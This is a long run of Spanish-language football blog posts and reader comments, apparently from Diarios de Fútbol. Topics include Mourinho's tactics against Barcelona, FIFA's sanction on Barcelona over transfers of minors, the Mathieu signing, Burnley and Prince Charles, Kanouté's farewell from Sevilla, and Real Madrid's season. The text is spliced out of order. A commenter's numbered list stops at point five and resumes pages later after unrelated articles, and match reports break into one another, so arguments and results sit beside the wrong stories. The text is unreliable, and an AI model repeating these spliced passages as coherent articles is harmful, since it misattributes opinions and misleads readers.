Como nunca le he visto contaré como se cuenta en la barra de un bar a no se sabe ni que hora. Será insuficiente e inconexo y si lo leen así les hará más gracia.A Barbadillo le llamaron Patrulla, apodo que le hubiera sentado mejor a algún carnicero de los que juegan con el dos en la espalda. Y todo porque se dejó el afro. La tele setentera del Perú escupía sin desmayo las andanzas seriales de tres policías mercenarios, aquello se llamaba Patrulla Juvenil y uno de los protagonistas era un negro con más rizos que Julius Erving. Dos más dos son cuatro. Y ahí arrancó el Patrulla, en Sports Boys del Callao para regatearse al mundo y acabar triunfando en Deportivo Lima y luego mucho, muchísimo más, en la U de Nuevo León. Después Italia.Me cae bien el Avellino por lo mismo que muchos otros equipos de medio pelo que sólo han remontado la ola en un par de ocasiones. Son como el Oviedo. Los lobos además juegan de verde, color de camiseta precioso y ennoblecido desde el día que molestó en la narración a algún comentarista imbécil, tienen un estadio tipo bañera lleno de italianos del sur y han desaparecido del mundo tras unos años de dulzura moderada en la cima.Más allá del pasmo, más allá de la admiración. Un silencio litúrgico.Ayer saltó la noticia de que Özil se marchaba del Madrid, se marchaba de la Liga, se marchaba de España. Y casi cualquier comentario que se escuchaba o leía sobre ello andaba teñido de pena, de tristeza, de esa melancolía previa que siempre es la peor. Frases de madridistas y no madridistas, de compañeros y rivales, de amantes del fútbol, en suma. Porque correr, regatear, pasar, fintar o marcar lo logran muchos futbolistas, mejores o peores, en todos los campos lo vemos cada día. Pero hay algo que sólo está al alcance de unos pocos elegidos, de los que no llegan al puñado por generación, y cuyos nombres se transmiten sin demora a las siguientes. El don. Un poder que consigue algo que deja atrás la emulación, la envidia o incluso la unanimidad. La facultad de, por un segundo, detener el mundo.En silencio. Ha estado de actualidad recientemente por su rajada masiva número 1.426 y también por una gran entrevista realizada por Mónica Marchante en Espacio Reservado. Vuelve Clemente a la Liga, vuelve el espectáculo, no necesariamente para todos los públicos. Algo no encajaba en la despedida de Preciado de Gijón, con las lágrimas de Vega-Arango en homenaje al tipo al que estaban echando, y el extraño caso se ha completado con la llegada de un hombre que genera tanto polémica como cariño su predecesor. Leyenda del Athletic, controvertido hasta el final como seleccionador –servidor asistió hace pocos días a la última discusión respecto al verdadero potencial de aquella España del 94- en los últimos años se ha despeñado su caché al tiempo que se difuminaba su perfil. Clemente se ha convertido en una especie de trotamundos, que tan pronto aparecía en Marsella, en Belgrado o en Yaoundé, aventuras que comenzaban prometiendo y acababan indefectiblemente en el terreno de la anécdota o el exotismo. Sin embargo, sigue conservando cierta aura, y su credo futbolístico suele ser del agrado de quienes buscan solidez para espantar los fantasmas del descenso. A ese clavo ardiendo se agarran los dirigentes del Sporting, y los demás observaremos con curiosidad, como siempre, a este peculiar sujeto que, para bien o para mal, es ya historia del fútbol español. Suele ocurrir que tras los grandes partidos, o simplemente de la nada, surjan interesantes discusiones en la lista de correo de Diarios de Fútbol, donde los editores exponemos nuestra opinión. Tras el primer clásico de la tormenta, Dadan Narval y yo nos enzarzamos en un acalorado debate sobre la licitud o no del planteamiento de Mourinho en el Bernabéu. Al dejarlo, ambos decidimos escribir una entrada en el blog justificando nuestra opinión. Él ha cumplido su parte esta mañana, lanzando sus puntos de vista en un artículo tan rico y potente como todos los que suele publicar. Sin embargo, cuando servidor se disponía a lanzar su réplica unas horas más tarde, se ha encontrado un impresionante debate en los comentarios, en el cual se desgranaban concienzudamente todas las ideas que circulan alrededor de este asunto. Así, no deseando ser redundante, y sobre todo como homenaje a nuestros comentaristas –mucho de los cuales son compañeros en nuestra aventura, del otro lado de la barrera, desde hace años- dejo fluir algunos de los comentarios que articulan con absoluta exactitud el discurso que yo pensaba desarrollar en esta entrada, y que merecen más que quedar perdidos en un scroll infinito. Sólo, antes de dejarle la palabra al pueblo, una única idea que creo que no ha sido suficientemente remarcada, y que está un poco en la base de todo. [Ramón Flores] El gran problema del Madrid en estos últimos años no es que el Barcelona sea sólo tan buen equipo, sino que los mejores jugadores del mundo, en abrumadora mayoría, están en el Barcelona. Eso quiere decir que son inaccesibles para el Madrid. Así, por muchos millones que tengas o te gastes, nunca vas a tener a Messi ni a Alves, y no hay otro Messi ni Alves. Cristiano le costó al Madrid 96 millones de euros y al lado de Messi es un tuercebotas.El que no vea la enorme desproporción de calidad futbolística que hay entre el equipo titular del Real Madrid y el del Barcelona está ciego o habla interesadamente. ¿Cuántos titulares cambiaríamos de uno por titulares de otro? [kpitel] La validez del pensamiento positivo, esa idea de que puedes conseguir lo que quieras con tal de pensar que puedes conseguirlo es totalmente errónea y suele llevar a cometer gravísimos errores de apreciación. Por mucho que desee, quiera y me convenza de que yo puedo ser, por ejemplo, una estrella del futbol, si no tengo las cualidades necesarias, por mucho que entrene será imposible. El batacazo moral es inevitable. Y esto se puede aplicar a todos los órdenes de la vida y a situaciones individuales y grupales. Y con el Real Madrid pasa lo mismo, convencerse de que se tiene la mejor plantilla, etc. etc. etc. no significa que la tengas ni que vaya a ser cierto. Y luego pasa lo que pasa. [Juan] Parece ahora que jugar bien sólo es tener la posesion del balón. El Barça tiene jugadores mas adecuados para tenerla. Es imposible que el Madrid tenga mas posesion del balon. Tiene otras cualidades que el Barça no tiene y tiene que explotarlas. [Maxx] A mi me empieza aburrir la cantinela de la plantilla, la cobardía, el encerrarse y Ozil. Con esta misma plantilla, con Özil que ni la olió, jugando de tú a tú, sin renunciar a ser el Real Madrid y todas esas milongas, en la primera vuelta nos metieron cinco y nos dieron un baño vergonzoso, y se criticó a Mou por renunciar a sus principios y salir a jugar de tú a tú al Barça. Y ahora llega Mourinho, es fiel a sus principios y está a punto de ganar con diez al mejor equipo de la historia y también se le critica. [juampex] No considero que el Madrid esté renunciando a su estilo, ni a la calidad de sus jugadores, ni condenándoles a ser meros ejecutores de la estrategia de un entrenador. El Madrid, si algo le caracteriza, es competir. Y si se puede, competir jugando bien, pero de entrada competir. Y para competir uno tiene que ser consciente de sus virtudes y sus fallos, así como de lo que le viene mejor o peor a su rival. Es, ni más ni menos, el mismo “qué” del Barcelona, competir sabiendo tus virtudes, pero con un “como” distinto. El propio Rafa Nadal lo explicó ayer de manera muy sencilla.” Si yo pierdo contra un rival 6-1 y 6-0, la próxima vez tendré que cambiar algo”. Es simplemente eso.Otra cosa es caer en el estereotipo de “jugar como equipo pequeño”, despreciando, como se hace en tantas ocasiones, y como bien explicó Sergio Cortina hace un par de días aquí mismo en DDF, cualquier opción de juego que no pase por el control del balón. Hay un sesgo en psicología que explica parte de ese estereotipo, el “error fundamental de atribución” consistente en atribuir un comportamiento a las características del propio individuo sin tener en cuenta las circunstancias ambientales. Es este caso, y muchísimo más desde que está Mourinho, el que considero lleva produciéndose toda la temporada.El Madrid necesitaba no perder el sábado, aunque pudiera suponer poner de relieve lo inalcanzable que es (y que ya era antes de ese partido) la liga a día de hoy. Pero, ese empate le sirvió principalmente para mostrarse a sí mismo, y a gran parte de sus aficionados aunque aquí ya cada uno lo interpreta a su modo (e influenciado, como bien dice Dadan, por las circunstancias que a uno le van marcando desde su nacimiento), que la diferencia real con el FCB no eran ni aquellos cinco goles ni la pésima imagen de equipo atropellado que ofrecieron. Y que aún estando posiblemente un peldaño por debajo (o no) cada enfrentamiento con los blaugranas no es una visita al matadero. [Bp] El otro día, el Madrid reconoció por primera vez abiertamente que es inferior al Barça, y que desde esa inferioridad aspira a desbancarlo, lo cual es lícito y posible. Lo que no puede ser es menospreciar la gran obra del Barça de las últimas tres temporadas suponiendo que simplemente gastando dinero y fichando al supuesto mejor entrenador te basta.Saberte inferior puede crearte un complejo peligroso (el que tiene el Atlético con el Madrid, por ejemplo), pero también puede ser el primer paso para crecer y superar a tu adversario. Reconocer tus defectos y las virtudes de tu rival es positivo para anularlos, como primer paso para desarrollar tus virtudes.Así que celebrar un empate puede ser un acto cobarde, pero celebrar que tu rival no ha sido superior a ti por primera vez en años, no lo es tanto. [theblues] El debate es mucho más simple de lo que planteas. Claro que el Real Madrid tiene opciones de ganarle al Barcelona jugando de tú a tú. La pregunta no es esa. La pregunta es: ¿tiene más opciones de ganarle jugando de tú a tú que de ganarle como planteó el partido el otro día? Mourinho cree que no, y por eso jugó así. Me parece absurdo pedirle a un entrenador que renuncie a jugar como tiene más posibilidades de ganar.No soy ni del Madrid ni del Barcelona, pero veo mucha soberbia en la exigencia del Barcelona de pedir a los rivales que jueguen como ellos quieren. En casi tres años, y bajo mi punto de vista (que igual no es acertado, pero es totalmente neutral), solo dos equipos no fueron inferiores al Barcelona: el Chelsea hace dos años y el Inter el año pasado.Y también me hace gracia oir a culés hablando de la grandeza del Real Madrid en tiempos pasados, otrora ridiculizada. Diciendo que el Madrid se merece jugar de otra forma… El Madrid que ganó las últimas tres Copas de Europa no era la excelencia precisamente. En las tres temporadas, no solo no ganó la Liga sino que estuvo muy lejos de hacerlo. [Luis_Candelas] Lo que el culé lleva pretendiendo desde el sábado es precisamente eso, que el madridista crea que su equipo es una pena. Y se está encontrando una y otra vez con que no, que en general el ambiente es de optimismo. ¿Que nos gustaría ver a Özil, Cristiano, Benzema, Higuaín, Kaká, Di María y Alonso haciendo paredes en la frontal? Pues a lo mejor sí, pero después del sábado el madridista medio está más tranquilo. Lo que me fastidia es que sean los culés los que hablen de la entidad del equipo, de su historia y demás, y hacerlo pasar por preocupación de verdad, porque es pura hipocresía. Que ayer leí a un culé diciendo que era más madridista que los madridistas porque quería que el Madrid no jugase al contragolpe: a esos extremos está llegando la cosa. No, es que las dos últimas veces que el Madrid ha salido a jugar al Barcelona de tú a tú se ha llevado las tundas de su vida. Otra tunda el sábado hubiese dejado al equipo herido de muerte. Permítenos que, al menos, terminen los cuatro encuentros para enterrar la “identidad” del Madrid. Que me hace gracia también el “es la primera vez que…”, que fue LO MISMO que se dijo el debut de Juande, que vale, era el Camp Nou y otra situación, pero esa cantinela ya la he oído antes. [Pedro] Una opinión esquemática:1. Porque el Madrid juegue de forma defensiva y a la contra contra un rival de los 30 con los que se ha enfrentado este año no traiciona su historia/espíritu/idiosincrasia, etc. (salió a mandar en Milán, cosa que no se había hecho jamás, pero nadie se quiere acordar)2. Se critica el planteamiento del otro dia pero nadie aporta una mejor opción.3. La gente que pide que juegue como todo el año pide la alineación del 5-0 y ya se vió lo que pasó.4. El Madrid no tiene jugadores para disputarle la posesión al Barça, si no eres capaz de robar arriba tienes que meterte atrás, porque una presión a medias tintas es un suicido (cosa que sucedió en el 2-6 y 5-0)5.Me cuesta entender que haya gente aquí al lado que disfrute de esto, que se regodee de la desgracia cuando yo estoy jodido y dolido. Vale, esto no es lo de Suiza en Sudáfrica, como se ha señalado por ahí en un intento de recuperar rápidamente la moral de la tropa. Esto no es un tropiezo torpe ni un accidente. Esto es un repaso completo. Esta vez la imagen es otra bien distinta a la de aquel partido de Durban. Pero no es el resultado definitivo, toca levantarse y reaccionar, no hacer sangre y echar espumarajos por la boca. Lo fácil sería sacar el cuchillo, buscar culpables y pasarlos por la piedra. Si visten jersey y calzan guantes, mejor, que sangran más. ¿Qué ganaríamos con eso? No caigamos en los errores de siempre. En la mañana del pasado miércoles se conocía que la Comisión Disciplinaria de la FIFA había decidido imponer una sanción al FC Barcelona por diversas irregularidades cometidas por el club catalán en los traspasos y posteriores inscripciones de diversos futbolistas menores de edad entre los años 2009 y 2013. Al parecer, el Barça, en connivencia con la Real Federación Española, habría incumplido con los requisitos establecidos por el artículo 19 del Reglamento sobre el Estatuto y la Transferencia de Jugadores de la FIFA, que determina, entre otras, la prohibición de las transferencias internacionales de jugadores menores de dieciocho años, excepto en los casos de cambio de domicilio de sus progenitores, de que el traspaso se perfeccione sin salir del ámbito del espacio económico europeo siempre que el futbolista sea mayor de dieciséis años o de que el jugador resida a menos de cincuenta kilómetros de la frontera con el país del club que desea inscribirlo.En su elogiable esfuerzo por salvaguardar los derechos del menor en el ámbito del fútbol, el máximo organismo internacional ha decidido utilizar castigar al Barça en una muestra de que no habrá mano blanda con quien se salte la normativa sobre un asunto tan delicado como la protección al menor. Sin excepciones, al parecer. Tras la sanción, que contempla la prohibición de practicar nuevas contratataciones en los dos próximos periodos de mercado (verano de 2014 e invierno 2014/15), subyace una clara función ejemplarizante. El Barça, paradigma del fútbol de cantera, también hace las cosas mal y es castigado en consecuencia por ello. Y quizá sea por ahí por donde más se pueda atacar la resolución de la FIFA, por su intención de demostrar las duras consecuencias que se derivan de determinadas conductas entendidas como irregulares o ilícitas apoyando la fuerza de la resolución en un caso tan concreto y de tantísima trascendencia como el del FC Barcelona.A lo largo del día de ayer esuché numerosas reacciones a la sorprendente, por inesperada, sanción de la FIFA. Algunas, de entrada, calificaban ciegamente la sanción de ‘desproporcionada’… sin saber exactamente cuál era el motivo o la norma infringida por el Barça. Somos así. Cuando nos tocan ‘lo nuestro’ tendemos a reaccionar con vehemencia, defendiendo lo que entendemos justo incluso con irracionalidad, aunque realmente no haya por dónde agarrarlo. Pero la sanción no es aleatoria. La sanción responde a una infracción, a la comisión de una irregularidad aún a sabiendas de que se estaba cometiendo. Me sorprende, llegados a este punto, la torpeza del club. No hubiese sido complicado para una entidad con las dotaciones del Barça urdir una trama que encubriese las diversas incorporciones a su cantera de futbolistas extranjeros menores de edad. Hecha la ley, hecha la trampa. O estuvo muy mal asesorado jurídicamente, o creyó disfrutar de un estatus de inviolabilidad extraordinario.Y algo así puede desprenderse del torpe comunicado emitido por el club en el día de ayer. A lo largo de catorce escuetos puntos, el Barça responde al expediente sancionador de la FIFA saliéndose por la tangente y aludiendo a lo intachable que resulta su modelo de cantera deportiva, echando balones fuera de manera descarada. ‘Solo en Cataluña se estima en 15.000 la cifra de jugadores menores de edad inscritos federativamente, que estarían en situación irregular por haber nacido fuera de España, según los criterios de la FIFA en su expediente sancionador‘, destaca en el último punto. Es decir, que vale, que yo puedo estar incumpliendo, pero ojo, que los demás también. Dónde vas, manzanas traigo. La Masía utilizada como escudo, como argumento frente a cualquier ataque, como salvoconducto universal. Sin embargo, no pone el expediente sancionador en duda lo modélico del funcionamiento de La Masía, ni su programa de formación educativa. No resta méritos a esos ‘candidatos a Balón de Oro‘ a los que alude expresamente el comunicado del club como argumento de defensa. Lo único que pone de manifiesto es la existencia de diversas irregularidades, en relación con el Reglamento sobre el Estatuto y la Transferencia de Jugadores, en la transferencia internacional de varios futbolistas menores de edad, materia sobre la que el comunicado azulgrana no se pronuncia en ningún momento. Como si obviar el problema fuese una vía de resolución del mismo.No creo que el modelo de La Masía que tanto se esfuerza por ensalzar y defender el Barça en su comunicado haya quedado en entredicho. Nadie en su sano juicio va a poner ahora en duda que la escuela de formación deportiva y humana del FC Barcelona es ejemplar y que su funcionamiento es referencia en todo el mundo, pero eso no implica necesariamente que no se hayan cometido ciertas irregularidades que se consideran probadas en el expediente sancionador de la Comisión Disciplinaria de la FIFA. El Barça tiene ahora la oportunidad de probar que tales irregularidades no existieron y de presentar el correspondiente recurso ante la Comisión de Apelación y, en su caso, someter su resolución a juicio del Tribunal de Arbitraje Deportivo, amén de solicitar las medidas cautelares que se consideren oportunas mientras no exista resolución firme. Es de esperar que los argumentos esgrimidos en su defensa sean de mayor contundencia que los escuetamente hilvanados en su comunicado. Dice el amigo Óscar Díez que hoy España no juega, sino que se la juega. Y sorprende, sobre todo, porque lo hace en un ambiente general de despreocupación y falta de motivación que asusta. Como en una especie de regresión maldita al año 2007, a la nueva España, la que pierde en Bratislava y navega por aguas contaminadas desde el pasado verano, no hay quien la reconozca a través de sus más recientes convocatorias. El necesario proceso de regeneración es un hecho y hasta once futbolistas de la última citación andan por debajo de las ocho internacionalidades absolutas. Alguien decidió que era buena idea abrir los ventanales y ventilar bien la casa, y realmente lo era, pero se olvidó de cerrarlos y ahora hace un frío que pela.Porque uno mira la lista de convocados de Vicente del Bosque, el mismo que ahora ha decidido que no piensa tomarse en serio la renuncia a la selección de David Villa, para el doble duelo ante Ucrania y Holanda y tiene dos opciones. O bien, desde la vis positiva, se aferra a la ilusión, a la estimulante presencia de caras nuevas y al obligado paso al frente que deben de dar los que en 2014 aún eran demasiado jóvenes, o bien compara a los San José, Juanmi, Morata, Bartra, Vitolo o Asenjo con lo que relucía hace dos o tres años y comienza a hacerse a la idea de que años dificiles están por llegar. España duda, como duda su afición de ella. Porque quizá no fue del todo buena idea encomendar la transición a quien llegó a lo más alto con el equipo nacional (por más que algunos pensarámos en su momento que la mejor corriente era la continuista). Porque la sensación de ruptura con el pasado glorioso no es firme y aún quedan rescoldos de la gran fogata que se resisten a apagarse. Y, muy especialmente, porque quizá en algunos casos muy concretos el relevo generacional haya sido un poco atropellado, forzado por las circunstancias y agravado por la premura y urgencia que conlleva el no haber tomado decisiones cuando fue necesario tomarlas.España también juega, y de qué manera, en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Jérémy Mathieu (Luxeuil-les-Bains, Francia, 1983) es un buen futbolista. Y no es flor de un día. Su rendimiento en el Valencia CF ha sido siempre, en las cinco temporadas en las que ha permanecido en Mestalla, como mínimo de notable, haciendo tal vez la excepción de la temporada 12/13 en la que unas molestias persistentes en el talón de Aquiles obligaron al francés a pasar más tiempo del deseado en boxes. Sorprende sin embargo la contratación del exvalencianista por el FC Barcelona no tanto por el nivel futbolístico del jugador, que le capacita de pleno para formar parte del nuevo proyecto de barcelonista comandado por Luis Enrique, sino por el tiempo y la forma. ¿Es un fichaje económicamente rentabilizable, teniendo en cuenta el montante de la operación y la edad del futbolista? Ante la imperiosa necesidad azulgrana de contratar los servicios de un, si no dos, defensor central… ¿no hubiese sido más razonable la elección de un especialista y de un jugador específico para la posición, en lugar de hacerse con un extremo, reconvertido a lateral, reconvertido a central? Dice el futbolista que se encuentra ‘en el mejor momento de su carrera deportiva‘. Y lo hace al tiempo que admite la intempestividad de la oportunidad de dar el salto a un club como el Barça. ‘Quizá llega algo tarde‘, reconoce. La justificación de la tremenda dificultad para dar con un defensa central apto para la zaga barcelonista pasa por las especiales exigencias del equipo en el puesto.La liga se perdió en Gijón, el objetivo del otro dia era salvar la sangría de derrotas y levantar la moral de la plantilla.6. La gente que pide un Madrid más abierto es la prensa que quiere ver un partido loco, los románticos véase Relaño o Di Stéfano y los culés que querrían un partido abierto para ver si cae otro manita. Los madridistas no quieren un partido loco, por algo será.7. He visto el partido repetido, por mucha posesión que tuviera el Barça tuvieron como cinco ocasiones cada uno con este planteamiento de Mourinho, con cinco ocasiones cada uno puede ganar cualquiera, si vas perdiendo 5-0 no puedes ganar.8. Cuando Pepe bajó a la defensa por la expulsión de Albiol, Messi empezó a encarar por el centro a cuarenta metros de portería y no lo paraba nadie. Mourinho cortó por lo sano al volver a poner a Pepe de mediocentro tapando eso, ese encare de Messi desde ahí es lo que ha matado al Madrid estos dos años. Mourinho solucionó eso con un cambio táctico metiendo a Arbeloa y cambiando la defensa, de eso no se habla, se habla de que si dijo digo o dijo diego (parece ser más interesante)9. Mourinho sabe más que todos nosotros y entrena todos los días con ellos, digo yo que a su planteamiento debe concedérsele como mínimo el beneficio de la duda.10. Se puede criticar que un equipo de patadas o que juegue defensivamente constantemente, no creo que sea criticable jugar a la contra contra el equipo que mejor maneja el balón de toda la historia. 82 partidos después y tras 210 minutos disputados en medio de una tensión lacerante, Granada y Celta se jugaron su destino en catorce penaltis. Benítez falló los que se tiraron mientras el balón aún corría, uno en el tiempo reglamentario y otro en la prórroga, pero asumió el riesgo de hacer un Palermo y dejó impronta de machote embocando el de la tanda. Una rueda que parecía sellada entre el error inicial de Carlos Calvo y la exquisita calidad de los lanzamientos del Celta, hasta que en el último momento el miedo a ganar fue más grande que Michu y lanzó su balón al cielo de Granada. Justo antes Óscar Pérez había clavado el panenkazo que ya es habitual, y justo después cumplió el guardamenta Roberto, un simple aperitivo antes de convertirse en héroe; sólo tuvo que mirar de soslayo a Catalá para adivinar que el lanzamiento iría a su izquierda, blando y flojo, como sabiendo ya el desdichado lanzador que el destino estaba sellado. Pasaron los andaluces, pues, tras un partido que quedará en el recuerdo por lo épico, la salida en tromba, el gol de Orellana, y el resurgimiento del Celta en un segundo tiempo pleno de intensidad. No bastó la tremenda demostración de Trashorras ni su romance con el larguero, no finiquitó el asunto el mismo Orellana en un remate a bocajarro que también tocó madera; tanta fue la electricidad que salió de los Cármenes, que hasta el árbitro sufrió un trastorno mental transitorio que llevó a pitar el final antes de hora. Pero nadie merecía perder en el tiempo reglamentario, así que el partido se encaminó a la suerte suprema. Donde el fútbol, siempre caprichoso, elige a los suyos. Le tocó al Deportivo. El equipo coruñés ha acabado pagando su defecto ancestral en los últimos años, la falta de mordiente, para caer derrotado (0-2) ante el Valencia, protagonista de sus peores pesadillas.No es sencillo encontrar centrales de perfil Barça con capacidad de jugar el balón, de controlar todo lo que ocurre en la vasta zona ubicada a su espalda en el esquema del Barça o de, en un momento dado, deshacerse de una presión asfixiante con un pase en largo hacia los extremos. De pronto es como si se hubiesen olvidado los sucesivos naufragios de Martín Cáceres, de Dmitro Chigrinski y de ese parche que sigue siendo Alex Song, o las dificultades de Marc Bartra (otros, como Marc Muniesa, lo tuvieron aún más complicado) para consolidarse en la zaga. Vistas las experiencias recientes y ante el inmovilismo y la pasividad de la secretaría técnica azulgrana en los últimos veranos, uno tiende a pensar que hay miedo al fracaso, a repetir tropiezos del pasado, a volver a pagar una morterada por un central que no es válido y que tiene que irse en mitad del escarnio. Porque la secretaría técnica de Andoni Zubizarreta está ahora, y siempre con el episodio del defensa central sobrevolando, más señalada que nunca.No es por Mathieu, que es un buen futbolista y que con su versatilidad no debería sufrir demasiado para hacerse con un puesto más o menos estable en el once culé. Pero son veinte millonazos por un jugador próximo a cumplir los treinta y uno, y se trata de un jugador que, pese a su edad, lleva únicamente año y medio jugando en la posición de defensa central. Seguro que, de entre todas esas decenas y decenas de informes que manejaba Zubi, existía alguna otra opción más convincente. Puede que sea una historia mínima. Una anécdota de poca monta que probablemente pasaría desapercibida si delante del teclado que esto escribe no hubiese un tío sumido en la espesura del verano y machacado por su tradicional ausencia de fútbol trascendente y con poso. Es más, puede que la batallita ni siquiera os interese lo más mínimo, pero es una historia con su significado y su relevancia: el Príncipe Carlos de Inglaterra es fiel y rendido seguidor del Burnley Football Club.Porque el Burnley es un equipillo de una ciudad desaconsejable, de un lugar por el que no se pasa y al que no se acude a no ser que vivas allí y acabes de terminar tu jornada laboral en la cercana Manchester. Si nos perdemos en la noche de los tiempos y en ese fútbol casi de daguerrotipo pues sí, entonces encontramos a un equipo con un cierto fuste, cofundador del campeonato liguero en 1888 y posteriormente flamante vencedor del mismo en los lejanos años 1920 y 1959. Desde entonces, un equipito de andar por casa, discreto y habitual de divisiones inferiores.Y es precisamente por eso por lo que sorprende, y en cierto modo emociona y satisface. Porque no todos los días puede un club tan modesto con el Burnley presumir de seguidores de alcurnia y relevancia social y porque resulta llamativo que alguien tan acostumbrado a otro tipo de cosas en el resto de ámbitos de su vida se decante por una apuesta tan discreta y de tercer plano como la de los Clarets y no por uno de los gigantes londinenses o, al menos, por un equipo puntero de la Premier League.Pero, ¿por qué, precisamente, el Burnley? Es sabido que varias de las organizaciones adscritas a The Prince’s Charities (amalgama que agrupa a diversas entidades de carácter benéfico y de desarrollo social) han venido desarrollando su trabajo en el área de Burnley, una zona de fuerte vinculación industrial, especialmente dedicada al sector textil desde los lejanos tiempos de la Revolución Industrial y que en las últimas décadas ha venido experimentando una transformación considerable, perdiendo buena parte de sus factorías y convirtiéndose en una pequeña ciudad residencial aquejada de los lógicos problemas sociales que conlleva una transformación de ese tipo. La ciudad ha sido puesta como ejemplo por el propio Príncipe de Gales de lo que el trabajo en la comunidad puede llegar a conseguir y es para él especial motivo de orgullo por el impacto que han causado en la zona las actuaciones de sus organizaciones benéficas.Para terminar de rizar el rizo y para que nadie termine echándome en cara que sí, que realmente la historia era mínima, conviene aclarar que el Burnley heredó sus tradicionales colores ‘claret & blue‘ del Aston Villa, como una muestra de reconocimiento al que fuese gran dominador del fútbol inglés a principios del siglo XX. ¿Saben quién es un reconocido y enfermizo seguidor villan? Sí, el Príncipe Guillermo.Puedes comprar camisetas del Burnley FC en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Es probable que muchos de nuestros lectores conozcan la historia, o al menos hayan oído hablar de ella. También habrá más de uno que se haya preguntado alguna vez de dónde viene un nombre tan curioso y aparentemente insignificante como Sampdoria, y por qué el equipo de la capital de la Liguria fue bautizado con ese extraño nombre.No pudieron los coruñeses nivelar el temprano gol de Aduriz, que silenció muy pronto un Riazor volcado y, a su vez, proporcionó un cierto colchón moral a unos rivales que en ningún momento se vieron el pozo. Entre ellos sólo falló el Mallorca (3-4), incapaz de hacer frente en Son Moix a un soberbio Kun Agüero, autor de tres goles. Cumplieron Getafe y Real Sociedad (1-1), que bajaron el ritmo cuando fueron conscientes de que el empate les valía a ambos, y evitaron cualquier problema Zaragoza y Osasuna con sendas victorias (1-2 y 1-0) frente a Levante y Villarreal, respectivamente -grande Gabi– Nuestro pequeño homenaje a la gran afición del Deportivo, que ha sabido digerir con deportividad su travesía de la gloria al desierto, y que desde esta tarde se apiñó junto a la playa para darle a los suyos un apoyo que al final no ha servido. No están tan lejos las gestas del Superdepor, con muchas de las cuales disfrutamos todos los aficionados, así que ánimo en esta hora amarga. Y los demás, a celebrar entre el alivio y la felicidad. Hoy se disputa una nueva final de la edición de esta Liga Europa que muchos seguimos llamando mentalmente Copa de la UEFA. Si uno vuelve la vista atrás y esquiva por un momento el brillo de la gran final de Dortmund en la que el Alavés nos ganó perdiendo –imprescindibles los reportajes que están dedicando esta semana los chicos de Canal Plus a tan magno evento-, se da cuenta de que, en tiempos recientes, sólo un equipo ha repetido levantando uno de los trofeos más peculiares del Planeta Fútbol. Fue el Sevilla, para quien este torneo representa mucho más que un par de resultados, dos fechas o unos kilos de plata. La Copa de la UEFA será recordada dentro de muchos años como el grial del sevillismo, de una época donde se mezclan recuerdos de gloria, el himno del Arrebato y la percepción objetiva de que, por última vez en mucho tiempo, alguien le plantó cara a la dicotomía cósmica que gobierna el fútbol español. Por eso, en un día como hoy resulta apropiado rendir un pequeño homenaje al que quedará para la posteridad como emblema de aquella generación, y que durante años ha constituido una prueba fehaciente de que las gemas de la Liga no sólo se han guardado en las cámaras acorazadas de Madrid y Barcelona. Nos referimos, por supuesto, a Frédéric Freddy Kanoute, que el fin de semana se despidió de la grada de Nervión.No causó un gran impacto su llegada al fútbol español.El ojo clínico de Monchi, que ha descendido en agudeza con el paso de los años, detectó la ganga que se ocultaba en Londres ante la indiferencia de Martin Jol y el común de la hinchada lilywhite. Siete millones de euros después aterrizaba el futbolista en el aeropuerto de San Pablo, y alguna suspicacia se levantó en su presentación, al pisar por primera vez el césped del Pizjuán con su desgarbado 1’93, su sempiterna seriedad y esa pose de ulema que acabó convirtiéndose en un clásico de la Liga. Pinta aparte, y excepto algún que otro parabólico que lo hubiera seguido desde sus comienzos en Lyon, se pensaba en Sevilla que había llegado un tanque, un nueve de área que impondría su físico y juego aéreo a los centrales rivales. Un ariete, por tanto, a la medida del juego directo e intenso que pretendía Juande Ramos para su equipo.Y sí, Freddy fue todo eso. Y efectivo. Y un sensacional goleador. Pero sobre todo, el fútbol español descubrió a uno de los delanteros más elegantes que haya brillado en el continente en el último cambio de siglo. Pocos como él han convertido el simple descenso de un balón volador en un paso del Bolshoi, la protección de la bola en un baile hipnótico, la definición en caricia. Ver jugar a Kanoute evocaba la tranquilidad en medio de la tormenta, la clase frente al ruido, la calma superior de un guerrero masai enfrentándose a un animal salvaje. Una forma de jugar que se ha correspondido con una forma de ser y vivir –su papel en la comunidad musulmana de Sevilla ha traspasado con mucho lo anecdótico- y que ha dejado en el fútbol español una impronta que tardará tiempo en borrarse. Porque la figura de Kanoute se ha proyectado más allá delas noches gloriosas, los títulos y los goles; por encima de su vuelta a White Hart Lane, de la Supercopa al gran Barça, el hat-trick al Madrid y el inolvidable chicharro al Getafe. Dentro de una semana la Liga se quedará un poco huérfana, porque lo que se va es un icono, cerca de la leyenda, camino del mito. La paz sea contigo, allá donde vayas. Se hace realmente difícil tratar de resumir en unas pocas líneas lo que ha sido la temporada del Real Madrid, por cuanto que alrededor del club, y también entre su afición, no parece haber consenso sobre casi nada en lo que se refiere al balance de la temporada. Mientras que por un lado se habla de que una Copa del Rey es un premio ínfimo para la inversión realizada por el Madrid a principios de temporada, en el otro se hace hincapié en el recorte de la distancia competitiva con este Barcelona estelar, que sólo tumbó a los blancos en Champions tras una eliminatoria llena de polémica, y que necesitó un ritmo sobrenatural para batirlos en Liga. Si unos confían en Mourinho como guía para el futuro –es la segunda vez en seis años que el Madrid no cambia de entrenador en verano-, otros lo ven como un pasaporte hacia el descrédito, e incluso un tercer grupo piensa qué ocurrirá cuando se marche el portugués. De hecho, si algo pone de acuerdo a todo el mundo, es que The Special One ha centralizado la atención de todos los medios que siguen al club, y por ende de todo el público. Para lo bueno y para lo malo.Quizá para situarnos sea interesante realizar una pequeña recapitulación cronológica de la temporada del Madrid. El primer periodo puede considerarse como de optimismo desaforado entre el madridismo: la ilusión típica del comienzo de temporada, algo templada tras un par de partidos tristes y desvaídos, tomó forma a partir del liderazgo y algunos partidos muy completos del Madrid, como el 6-1 al Deportivo en el Bernabéu, el 1-4 de Málaga o la victoria 2-0 frente al Milan. Dos meses donde el equipo blanco desplegó con frecuencia un juego intenso y poderoso, pleno de velocidad, que desarbolaba a los rivales. Cristiano Ronaldo maravillaba con números de otro planeta, Özil enamoraba con su fútbol delicado e imprevisible, y Carvalho recordaba viejos tiempos en que era uno de los mejores centrales de Europa. Sólo un lunar, la grave lesión de Gonzalo Higuaín, que el equipo pareció no notar, hasta el frenazo en seco: el 5-0 del Camp Nou que seguramente advirtió al madridismo sobre la diferencia realmente existente con el máximo rival, al menos en un partido abierto.Lo que siguió fueron unos meses de reedición de lo que ya llevamos viviendo varias temporadas: los dos 